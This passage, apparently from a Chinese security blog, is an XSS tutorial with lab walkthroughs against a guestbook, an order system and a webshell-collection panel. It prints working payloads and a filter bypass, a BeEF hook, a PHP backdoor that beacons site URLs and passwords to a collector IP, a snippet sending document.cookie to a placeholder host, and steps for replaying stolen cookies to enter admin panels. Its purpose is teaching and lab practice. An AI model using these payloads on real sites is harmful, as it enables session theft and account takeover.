<code>&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;;&lt;/script&gt;</code>那么所访问的网站就会被跳转到百度的首页。早在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。具体各位可以自行百度。</p><h2 id="5-浏览器内核版本"><a href="#5-浏览器内核版本" class="headerlink" title="5.浏览器内核版本"></a>5.浏览器内核版本</h2><p>利用XSS需要浏览器版本和内核没有过滤XSS攻击（比如用谷歌Edge火狐等打开可以成功，但是IE却会拦截）</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image1.png" alt="image1"></p><h2 id="6-常出现场景"><a href="#6-常出现场景" class="headerlink" title="6.常出现场景"></a>6.常出现场景</h2><p>文章发表、评论、留言、注册资料的地方、修改资料的地方等</p><h1 id="二-XSS攻击的分类"><a href="#二-XSS攻击的分类" class="headerlink" title="二.XSS攻击的分类"></a>二.XSS攻击的分类</h1><p>XSS攻击分成两类，一类是来自内部的攻击，另一类则是来自外部的攻击</p><h2 id="1-来自内部的攻击"><a href="#1-来自内部的攻击" class="headerlink" title="1.来自内部的攻击"></a>1.来自内部的攻击</h2><p>主要指的是利用程序自身的漏洞，构造跨站语句，如:dvbbs的showerror.asp存在的跨站漏洞。</p><h2 id="2-来自外部的攻击"><a href="#2-来自外部的攻击" class="headerlink" title="2.来自外部的攻击"></a>2.来自外部的攻击</h2><p>主要指的自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个有跨站漏洞的网页，然后构造跨站语句，通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开。</p><h1 id="三-XSS的分类"><a href="#三-XSS的分类" class="headerlink" title="三.XSS的分类"></a>三.XSS的分类</h1><h2 id="1-反射型-非持久化"><a href="#1-反射型-非持久化" class="headerlink" title="1.反射型(非持久化)"></a>1.反射型(非持久化)</h2><h3 id="（1）原理"><a href="#（1）原理" class="headerlink" title="（1）原理"></a>（1）原理</h3><p>反射型xss又称非持久型xss，是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。</p><h3 id="（2）攻击方式"><a href="#（2）攻击方式" class="headerlink" title="（2）攻击方式"></a>（2）攻击方式</h3><p>攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后就会触发xss漏洞。</p><h3 id="（3）判断是否存在反射型xss漏洞并利用"><a href="#（3）判断是否存在反射型xss漏洞并利用" class="headerlink" title="（3）判断是否存在反射型xss漏洞并利用"></a>（3）判断是否存在反射型xss漏洞并利用</h3><ol><li><strong>判断有没有过滤一些特殊的字符</strong></li><li>**注入代码:**在留言框、评论区或者其他地方输入一些代码，提交后再查看源码看输入的代码是否存储到前端页面中。</li><li><strong>插入代码：</strong>一句简单的javascript回显代码，比如<code>&lt;script&gt;alet(1)&lt;/script&gt;</code></li><li><strong>利用XSS漏洞：</strong>将成功注入代码并能触发xss的网址通过电子邮件等方式发送给对方的手中，如果结合xss平台，对方点击了链接，就能得到对方的cookie等信息。</li></ol><h2 id="2-存储型-持久化"><a href="#2-存储型-持久化" class="headerlink" title="2.存储型(持久化)"></a>2.存储型(持久化)</h2><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image5.png" alt="image5"></p><h3 id="（1）原理-1"><a href="#（1）原理-1" class="headerlink" title="（1）原理"></a>（1）原理</h3><p>存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子就是留言板XSS，用户提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击。</p><h3 id="（2）攻击方式-1"><a href="#（2）攻击方式-1" class="headerlink" title="（2）攻击方式"></a>（2）攻击方式</h3><p>这种攻击多见于论坛、博客和留言板中，攻击者在发帖的过程中，将恶意脚本连同正常的信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久的存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在它们的浏览器中得到执行。</p><h3 id="（3）payload"><a href="#（3）payload" class="headerlink" title="（3）payload"></a>（3）payload</h3><p><code>&lt;img src=&quot;1&quot; onerror=&quot;alert(/xss/)&quot;/&gt;</code></p><p>注入后重新刷新发现直接回显注入的东西，说明是存储型xss</p><h2 id="3-DOM型"><a href="#3-DOM型" class="headerlink" title="3.DOM型"></a>3.DOM型</h2><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image.png" alt="image"></p><h3 id="（1）原理-2"><a href="#（1）原理-2" class="headerlink" title="（1）原理"></a>（1）原理</h3><p>文档对象模型Document Object Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分</p><p>DOM型xss其实是一种特殊类型的反射型xss，也被称作<strong>本地跨站</strong>，它是基于DOM文档对象模型的一种漏洞。<strong>DOM XSS和反射型XSS、存储型XSS的区别在于DOM XSS代码并不需要服务器参与，出发XSS靠的是浏览器的DOM解析，完全是客户端的事情</strong></p><p>DOM中有很多对象，其中一些对象可以被用户所操纵，如url，location等。客户端的脚本程序可以通过DOM来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得DOM中的数据后并在本地执行，因此仅从服务器端是没有办法防御DOM型XSS漏洞的，如若DOM中的数据没有经过严格的验证，便会产生基于DOM的XSS漏洞。</p><p>基于DOM的XSS是反射的特例，其中JavaScript隐藏在URL中，并在其呈现时由页面中的JavaScript取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的WAF或其他防护检测不出恶意内容。</p><h3 id="（2）攻击方式-2"><a href="#（2）攻击方式-2" class="headerlink" title="（2）攻击方式"></a>（2）攻击方式</h3><p>用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含xss代码。服务器的响应不会以任何的形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在xss漏洞。</p><h3 id="（3）payload-1"><a href="#（3）payload-1" class="headerlink" title="（3）payload"></a>（3）payload</h3><p><code>&lt;img src=&quot;1&quot; onerror=&quot;alert(/xss/)&quot;/&gt;</code></p><h1 id="四-XSS攻击的途径"><a href="#四-XSS攻击的途径" class="headerlink" title="四.XSS攻击的途径"></a>四.XSS攻击的途径</h1><p>XSS攻击方法只是利用HTML的属性做各种尝试，找出注入的方法。现在对三种XSS攻击的主要方式进行分析。</p><ol><li>第一种：对普通的用户输入，页面原样输出，攻击者通过对JSCODE的伪装，经过某些特定的操作就会跳出一个木马界面，从而取得登录用户的Cookie.</li><li>第二种：在代码区内存在有用户输入的内容</li><li>第三种：允许用户输入HTML标签的页面，用户可以提交一些自定义的HTML代码。</li></ol><h1 id="五、靶场实战"><a href="#五、靶场实战" class="headerlink" title="五、靶场实战"></a>五、靶场实战</h1><h2 id="1-PHP开源多功能留言板"><a href="#1-PHP开源多功能留言板" class="headerlink" title="1.PHP开源多功能留言板"></a>1.PHP开源多功能留言板</h2><p>PHP开源多功能留言板下载地址：<a href="https://link.zhihu.com/?target=https://down.chinaz.com/soft/37581.htm">https://down.chinaz.com/soft/37581.htm</a> ，按照教程安装即可。</p><p>管理员默认账号：admin</p><p>管理员默认密码：admin888</p><p>后台地址：//你的域名/index.php?c=adminlogin</p><h2 id="2-XSS平台"><a href="#2-XSS平台" class="headerlink" title="2.XSS平台"></a>2.XSS平台</h2><p><a target="_blank" rel="noopener" href="https://hk.sb/bdstatic.com">https://hk.sb/bdstatic.com</a></p><p>还有很多免费的XSS平台。</p><h2 id="3-进行攻击"><a href="#3-进行攻击" class="headerlink" title="3.进行攻击"></a>3.进行攻击</h2><h3 id="1-初次尝试"><a href="#1-初次尝试" class="headerlink" title="(1).初次尝试"></a>(1).初次尝试</h3><p>尝试用简单的JS代码进行XSS攻击</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image6.png" alt="image6"></p><p>发现存在JS过滤</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image7.png" alt="image7"></p><h3 id="2-绕过-lt-script-gt-检测"><a href="#2-绕过-lt-script-gt-检测" class="headerlink" title="(2).绕过&lt;script&gt;检测"></a>(2).绕过<code>&lt;script&gt;</code>检测</h3><p>使用以下语句绕过<code>&lt;script&gt;</code>过滤：<code>&lt;BODY onload=&quot;alert(1)&quot;&gt;</code></p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image8.png" alt="image8"></p><p>成功留言并触发回显</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image9.png" alt="image9"></p><p>管理员登陆后台查看留言也会出现弹窗</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image10.png" alt="image10"></p><p>弹窗的原因就是这句JS代码嵌入到了代码中</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image11.png" alt="image11"></p><p>(3).利用XSS平台获取cookie</p><p>此时利用XSS平台，启用默认模块，因为这个留言板会过滤<code>&lt;script&gt;</code>标签，因此我选择使用img标签进行XSS攻击。</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image12.png" alt="image12"></p><p>发送payload成功！</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image13.png" alt="image13"></p><p>然后管理员到后台查看留言</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image14.png" alt="image14"></p><p>此时XSS平台就有记录了</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image15.png" alt="image15"></p><p>然后在postman上利用获取到的Cookie值来登录后台</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image16.png" alt="image16"></p><p>登陆成功！</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image17.png" alt="image17"></p><h1 id="六-订单系统——军锋真人CS野战123"><a href="#六-订单系统——军锋真人CS野战123" class="headerlink" title="六.订单系统——军锋真人CS野战123"></a>六.订单系统——军锋真人CS野战123</h1><h2 id="1-靶场下载"><a href="#1-靶场下载" class="headerlink" title="1.靶场下载"></a>1.靶场下载</h2><p><a target="_blank" rel="noopener" href="https://pan.baidu.com/share/init?surl=lIUZvEVXs1du-Bmkt7-abA">https://pan.baidu.com/share/init?surl=lIUZvEVXs1du-Bmkt7-abA</a></p><p>提取码：xiao</p><h2 id="2-靶场安装"><a href="#2-靶场安装" class="headerlink" title="2.靶场安装"></a>2.靶场安装</h2><p>注意下载安装好后仔细查看安装说明，比如config.php的数据库账密要对，否则连接不上数据库。</p><p>由于这里是用phpstudy搭建的，phpstudy中mysql的默认用户名和密码都是root，这里也需要设置好用户名和密码。</p><p>注意此处设置好的管理员账号密码也都是root。</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image18.png" alt="image18"></p><p>设置好后访问install.php，并按照提示来搭建靶场。</p><h2 id="3-进行攻击-1"><a href="#3-进行攻击-1" class="headerlink" title="3.进行攻击"></a>3.进行攻击</h2><p>使用简单的JS语句<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>进行攻击。</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image19.png" alt="image19"></p><p>管理员登录后台查看订单，出现弹窗。</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image20.png" alt="image20"></p><p>可见这句JS代码已经嵌入到代码中了。</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image21.png" alt="image21"></p><h2 id="4-XSS平台获取Cookie"><a href="#4-XSS平台获取Cookie" class="headerlink" title="4.XSS平台获取Cookie"></a>4.XSS平台获取Cookie</h2><p>选择XSS平台的攻击代码</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image22.png" alt="image22"></p><p>进行攻击</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image23.png" alt="image23"></p><p>管理员登录后台查看订单就会触发攻击代码，此时XSS平台就能获取到Cookie值。</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image24.png" alt="image24"></p><p>然后在postman上利用Cookie值来登录后台。</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image25.png" alt="image25"></p><h2 id="5-Beef结合XSS攻击"><a href="#5-Beef结合XSS攻击" class="headerlink" title="5.Beef结合XSS攻击"></a>5.Beef结合XSS攻击</h2><p>在kali上安装Beef</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install beef-xss</span><br></pre></td></tr></table></figure><p>启动Beef</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/beef-xss</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./beef</span><br></pre></td></tr></table></figure><p>kali上自带beef，可直接打开</p><p>此处修改beef用户名和密码都为root，修改账号密码后重启一下。</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image26.png" alt="image26"></p><p>重启后登录beef页面</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image27.png" alt="image27"></p><p>攻击代码为<code>&lt;script src=&quot;http://127.0.0.1:3000/hook.js&quot;&gt;&lt;/script&gt;</code></p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image28.png" alt="image28"></p><p>进行攻击</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image29.png" alt="image29"></p><p>管理员登录后台查看订单，触发攻击代码</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image30.png" alt="image30"></p><p>beef端成功上线！</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image31.png" alt="image31"></p><p>接下来进行操作，比如获取Cookie</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image32.png" alt="image32"></p><p>浏览器跳转</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image33.png" alt="image33"></p><p>这样后台页面就会自动跳转</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image34.png" alt="image34"></p><p>社工攻击，利用模拟Flash更新向客户端发送请求，来实现下载后门</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image35.png" alt="image35"></p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image36.png" alt="image36"></p><h1 id="七-WebShell箱子管理系统"><a href="#七-WebShell箱子管理系统" class="headerlink" title="七.WebShell箱子管理系统"></a>七.WebShell箱子管理系统</h1><p>就是使用别人的webshell来进行获取服务器shell，但获取shell后<strong>webshell</strong>存在的<strong>恶意代码</strong>就会把网站信息和webshell密码，和用户名发到webshell的原主人来进行<strong>信息收集</strong>，通过大量获取的网站shell来进行<strong>贩卖</strong>，而使用webshell的人就成<strong>打工仔</strong>了。</p><p>反杀的意思就是像上面的<strong>窃取cookie</strong>道理一样通过向webshell的代码中插入窃取cookie的代码，当webshell 原注入查看沙箱时就会触发xss窃取cookie来达到<strong>反客为主</strong>！</p><p>既然说到了WebShell，推荐一个WebShell库：</p><h2 id="1-靶场搭建"><a href="#1-靶场搭建" class="headerlink" title="1.靶场搭建"></a>1.靶场搭建</h2><p>靶场地址：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw">https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw</a></p><p>提取码：xiao</p><h2 id="2-小旋风下载"><a href="#2-小旋风下载" class="headerlink" title="2.小旋风下载"></a>2.小旋风下载</h2><p>搭建一个asp的服务器，我们这里选用小旋风进行搭建<a href="https://link.zhihu.com/?target=http://lt.yx12345.com:90/yasuobao/jyx12345xiaoxuanfenglinshiaspfuwuqiminiban.zip">http://ttl7.pc6.com/lff/aspwebserver.zip</a>，下载完成后解压到虚拟机里面。</p><p>默认端口为80。如果80端口被占用或不想用80可用记事本打开main.box来修改默认端口。</p><p>这里修改为10086端口</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image37.png" alt="image37"></p><h2 id="3-靶场搭建"><a href="#3-靶场搭建" class="headerlink" title="3.靶场搭建"></a>3.靶场搭建</h2><p>将下载好的webshell箱子放在搭建好的服务器里面，这里我放到了8001端口下。</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image38.png" alt="image38"></p><p>此时可以通过<a href="http://localhost:8001来登录，但无法通过127.0.0.1:8001或者本机ip地址来访问。">http://localhost:8001来登录，但无法通过127.0.0.1:8001或者本机ip地址来访问。</a></p><p>这里设置一下host.ini文件即可</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image39.png" alt="image39"></p><p>通过ip地址来访问，账号密码都默认为admin</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image40.png" alt="image40"></p><h2 id="4-进行攻击"><a href="#4-进行攻击" class="headerlink" title="4.进行攻击"></a>4.进行攻击</h2><p>这里构造一个带后门的后门代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;sqzr&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]; <span class="comment">// HTTP_HOST当前请求头中 Host: 项的内容；PHP_SELF当前执行脚本的文件名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script src=&#x27;http://192.168.176.128:8001/api.asp?url=<span class="subst">$url</span>&amp;pass=<span class="subst">$password</span>&amp;id=1&#x27;&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>别人下载这个后门文件后将他传到一个网站中</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image41.png" alt="image41"></p><p>然后他去访问这个后门文件</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image42.png" alt="image42"></p><p>这时WEBSHELL箱子管理系统就会收到信息</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image43.png" alt="image43"></p><h2 id="5-反杀webshell原作者"><a href="#5-反杀webshell原作者" class="headerlink" title="5.反杀webshell原作者"></a>5.反杀webshell原作者</h2><p>有的webshell原作者会利用加密、编码、拼接字符等技术来隐藏URL，因此我们使用别人的webshell时一定要进行代码审计</p><p>当我们代码审计获取到webshell沙箱的URL后，通过访问webshell沙箱来植入XSS代码窃取cookie。</p><p>因为在webshell箱子管理系统显示的信息有URL和密码，因此我们可以在这两个地方植入XSS平台的攻击代码，这样当webshell作者查看后门时我们就能拿到webshell箱子管理系统的cookie了。</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image44.png" alt="image44"></p><p>可见webshell作者拿到了相关信息</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image45.png" alt="image45"></p><p>我们可以在XSS平台查看webshell作者的Cookie</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image46.png" alt="image46"></p><p>然后就可以通过这个Cookie值来登录webshell箱子管理系统的后台</p><p>使用postman进入后台实现反杀！</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image47.png" alt="image47"></p><h2 id="6-使用JS代码获取Cookie"><a href="#6-使用JS代码获取Cookie" class="headerlink" title="6.使用JS代码获取Cookie"></a>6.使用JS代码获取Cookie</h2><p>不利用XSS平台，自己写一个获取Cookie的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);img.src=<span class="string">&quot;http://xxxx/a?&quot;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);&lt;script&gt;</span><br></pre></td></tr></table></figure><h1 id="八-XSS攻击的检测"><a href="#八-XSS攻击的检测" class="headerlink" title="八.XSS攻击的检测"></a>八.XSS攻击的检测</h1><ol><li>在目标站点上找到输入点，比如搜索栏，错误页面，留言板等。</li><li>输入一组”特殊字符+唯一识别字符”，点击提交后，查看返回源码，是否做对应的处理。</li><li>通过搜索定位到唯一识别字符，结合唯一识别字符前后语法确认是否可以构造执行js的条件(构造闭合)。</li><li>提交构造的脚本代码以及各种绕过姿势，看是否可以成功执行，如果成功执行则说明该站点存在XSS漏洞。</li></ol><p><strong>Tips：</strong></p><ol><li>通常搜索栏容易出现反射型XSS，留言板容易出现存储型XSS；</li><li>有些网站鉴于后台可能存在过滤措施，组建的script可能会被过滤掉，因而无法生效或者环境限制脚本执行；</li><li>通过变化不同的script，尝试绕过后台的过滤机制。</li></ol><p><strong>下图为跨站脚本攻击流程图（Cookies）</strong></p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image2.png" alt="image2"></p><p>从图中可以看出：用户访问存在XSS漏洞的站点后触发脚本，漏洞站点给用户返回带有恶意js的页面；用户设备执行该恶意脚本后，攻击者即可窃取用户的数据（cookies），并伪装成用户对漏洞站点进行攻击。</p><h1 id="九-获取Session思路"><a href="#九-获取Session思路" class="headerlink" title="九.获取Session思路"></a>九.获取Session思路</h1><p>有的时候获取了Cookie，但是少了Session，会造成登不进后台</p><p>服务器开启了Session验证的话，我们只获取客户端的Cookie是没有办法通过验证的，</p><p>而且我们也无法获取存放在服务端的Session</p><p>如果需要获取Session，可以借助辅助文件，比如访问php探针时就会携带Session。</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image48.png" alt="image48"></p><p>如果能利用XSS让管理员页面跳转到phpinfo()界面，通过返回源码就能窃取Session</p><p>利用beef进行页面跳转</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image3.png" alt="image3"></p><p>获取页面源码</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image4.png" alt="image4"></p><p>获取源码中的cookie和session</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image49.jpg" alt="image49"></p><h1 id="十-HttpOnly"><a href="#十-HttpOnly" class="headerlink" title="十.HttpOnly"></a>十.HttpOnly</h1><h2 id="1-什么是HttpOnly"><a href="#1-什么是HttpOnly" class="headerlink" title="1.什么是HttpOnly"></a>1.什么是HttpOnly</h2><p>如果Cookie中设置了HttpOnly属性，那么通过JS脚本将无法读取到Cookie信息，这样能有效防止XSS攻击，窃取Cookie内容。 